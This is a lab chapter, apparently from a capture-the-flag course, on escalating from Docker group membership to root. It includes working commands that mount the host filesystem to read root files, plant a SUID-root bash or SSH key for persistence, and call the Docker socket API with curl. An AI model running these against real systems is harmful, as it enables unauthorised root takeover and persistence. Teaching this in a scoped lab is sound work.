# Chapter 08 — "Docker socket"  ·  The `docker` group is root

> **Host:** `hollow-forge-01` (compose service `target-docker`)
> **Foothold:** `labuser1 : password123`
> **Objective:** become **root** and read `/root/flag.txt`
> **Difficulty:** ★★★☆ (one idea, three ways to prove it)

---

## Mission brief

Hollow Industries' build host lets its CI user run containers, so they put
`labuser1` in the `docker` group. That one line is the vulnerability.

The Docker daemon runs **as root** and listens on `/var/run/docker.sock`.
Anyone who can talk to that socket can tell the daemon to start a container —
and a container can **bind-mount the host's entire filesystem** and run as root
inside it. Mount `/`, `chroot` into it, and you are root on the host. There is
no kernel bug and no SUID binary here; the socket *is* the privilege.

> **The whole idea in one line:** `docker run -v /:/host …` hands you the host's
> root filesystem as root — so `docker` group ≈ `root`.

This box runs its **own** Docker daemon (docker-in-docker), so the "host" you
take over is this container itself — which is where `/root/flag.txt` lives.

---

## Objective and rules

- **Win condition:** read `/root/flag.txt`. Flag format: `R2R{...}`.
- **In scope:** this container only.
- **Connect:** from the attacker box, `ssh labuser1@target-docker` (password `password123`).
  Or `docker exec -it -u labuser1 target-docker bash`.
- This box has **no internet**, so a tiny local image `rtr/bb` (static busybox)
  is pre-built for you to run. `docker images` shows it.

---

## Recon starter

```bash
id                              # are you in the 'docker' group?
ls -l /var/run/docker.sock      # can you write it?  (srw-rw---- root docker)
docker images                   # rtr/bb is ready to use
```

If `id` lists `docker` and the socket is group-writable, you're already root —
you just have to spend it.

---

## Stations

| Station | Technique | Proves |
|---|---|---|
| A | `docker run -v /:/host rtr/bb chroot /host cat /root/flag.txt` | read any file as root |
| B | mount `/`, write a SUID root `bash` (or your SSH key) | **persistent** root on the box |
| C | the raw socket API with `curl` — no `docker` client at all | the **socket**, not the CLI, is the bug |

One technique, three angles. Any one wins.

---

## Hints

<details><summary>Station A — mount and chroot</summary>

```bash
docker run --rm -v /:/host rtr/bb chroot /host cat /root/flag.txt
```
`-v /:/host` bind-mounts the host root into the container at `/host`. Inside the
container you're root (containers run as root by default), so `chroot /host`
drops you onto the host filesystem as root. `rtr/bb`'s busybox provides
`chroot`; `cat` is resolved from the host after the chroot.

</details>

<details><summary>Station B — make it permanent</summary>

A container is ephemeral; leave yourself something on the host. Copy `bash` and
set it SUID-root through the mount:
```bash
docker run --rm -v /:/host rtr/bb chroot /host sh -c 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash'
/tmp/rootbash -p -c 'id; cat /root/flag.txt'
```
`-p` keeps the elevated euid. (Dropping your SSH key into `/root/.ssh/` works
the same way.)

</details>

<details><summary>Station C — no docker client needed</summary>

The `docker` CLI is just an HTTP client for the socket. `curl` is enough:
```bash
CID=$(curl -s --unix-socket /var/run/docker.sock -X POST -H 'Content-Type: application/json' \
  -d '{"Image":"rtr/bb","Cmd":["chroot","/host","cat","/root/flag.txt"],"HostConfig":{"Binds":["/:/host"]}}' \
  http://localhost/containers/create | jq -r .Id)
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/$CID/start
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/$CID/wait
curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$CID/logs?stdout=1" | tr -cd '[:print:]\n'
```
Useful when a box has the socket exposed but no `docker` binary. The log stream
has 8-byte frame headers — `tr -cd '[:print:]\n'` strips them.

</details>

---

## Capture

```bash
id
cat /root/flag.txt      # via any of the three stations
```

The debrief — why the socket is root-equivalent, the mounted-`docker.sock`
variant, detection, and the fix — is in [WRITEUP.md](WRITEUP.md). Try the box
before you open it.
